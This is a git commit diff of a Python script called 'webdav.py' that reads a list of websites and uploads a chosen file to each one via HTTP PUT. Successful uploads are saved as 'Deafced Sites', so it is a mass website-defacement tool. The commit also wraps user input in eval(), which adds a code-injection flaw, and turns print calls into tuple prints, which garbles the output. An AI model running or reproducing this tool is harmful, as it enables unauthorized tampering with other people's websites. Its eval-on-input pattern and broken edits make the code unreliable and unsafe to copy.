a0efdc6795074f8ff448a90ab2fd93f3a44c4973
Zyney <65451125+Zyney@users.noreply.github.com>
2021-12-16 20:01:29 +0100

    Update webdav.py

--- webdav.py
+++ webdav.py
@@ -6,9 +6,9 @@ def banner():
 	os.system('clear')
 	print('''By ZyneyUA''')
 def main():
-	list=input(" Enter your sites list:: ")
+	list=eval(input(" Enter your sites list:: "))
 	opened=open(list,"r")
-	d=input(" Upload File:: ")
+	d=eval(input(" Upload File:: "))
 	data=open(d).read()
 	d="/"+d
 	for i in opened:
@@ -18,16 +18,15 @@ def main():
 				i='http://'+i
 			req=requests.Session().put(i+d,data=data)
 			if req.status_code==200:
-				print(Fore.CYAN,"Success==>",Style.RESET_ALL,i+d)
+				print((Fore.CYAN,"Success==>",Style.RESET_ALL,i+d))
 				f=open("success.txt","a")
 				f.write(i+d+"\n")
 				f.close()
 			else:
-				print(Fore.MAGENTA,"Fail==>",Style.RESET_ALL,i+d)
+				print((Fore.MAGENTA,"Fail==>",Style.RESET_ALL,i+d))
 		except  requests.exceptions.RequestException:
 			continue
 
 banner()
 main()
-print('\n',Fore.CYAN,'  [+]',Style.RESET_ALL,'Deafced Sites are saved as success.txt',Fore.CYAN,'[+]',Style.RESET_ALL)
-© 2021 GitHub, Inc.
+print(('\n',Fore.CYAN,'  [+]',Style.RESET_ALL,'Deafced Sites are saved as success.txt',Fore.CYAN,'[+]',Style.RESET_ALL))
